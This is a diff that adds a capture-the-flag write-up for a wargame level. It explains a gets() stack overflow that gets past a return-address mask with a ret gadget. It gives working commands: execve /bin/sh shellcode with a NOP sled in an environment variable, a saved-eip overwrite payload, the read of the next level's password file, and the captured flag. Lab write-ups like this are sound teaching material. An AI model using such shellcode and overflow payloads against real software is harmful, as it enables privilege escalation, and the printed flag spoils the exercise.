@@ -1,0 +1,16 @@
+The main function calls a function named "p". It calls gets with a buffer of 0x4c bytes. Then it checks if the return address of "p" match the mask "0xb0000000" : if this is true, it prints this address and calls exit and if this is false, it prints the buffer, strdup it and return to the main function.
+The mask is here to check if we rewrite old eip of "p" function and stop us to replace it by an address on the stack. But we can bypass this protection by using a buffer overflow with gets and replace old eip of "p" by the end of the "p" function to pop 2 times and bypass the mask check. After that, we can execute anything on the stack with our address.
+Here's the commands we used for this exploit:
+
+export SHELLCODE=`python -c 'print ("\x90" * 0xffff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")'`
+└->  we prepare our shellcode with a nop slide in the environment
+
+python -c 'print ("a" * 0x50 + "\x3e\x85\x04\x08" + "\x01\x01\xff\xbf")' > /tmp/a
+└-> we fill the buffer, replace old eip by this first address (which is "ret" instruction of "p") and old eip + 4 points to our shellcode.
+
+We reuse the technique on the previous exercise to keep stdin open:
+cat /tmp/a - | ./level2
+
+We have a shell open with level3 permissions !
+
+cat /home/user/level3/.pass : "492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02".
